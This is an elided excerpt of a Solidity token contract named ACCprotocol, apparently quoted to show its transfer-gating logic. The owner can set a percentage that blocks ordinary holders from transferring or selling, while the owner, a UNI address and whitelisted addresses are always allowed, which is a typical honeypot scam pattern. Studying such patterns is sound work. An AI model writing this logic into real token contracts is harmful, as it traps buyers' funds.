...
contract ACCprotocol  {
    ...
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
        ...
        if(_from == owner || _to == owner || _from == UNI || _from == tradeAddress || canSale[_from]){
            return true;
        }
    ...
    function condition(address _from, uint _value) internal view returns(bool){
        ...
        if (_value.mul(_percent*(10**uint256(decimals))) > balanceOf[_from]){
            return false;
        }
        return true;
    }
    ...
    function percent(uint256 num) public returns(bool){
        require(msg.sender == owner);
        _percent = num > 0 ? num*(10**uint256(decimals)) : 0;
    }
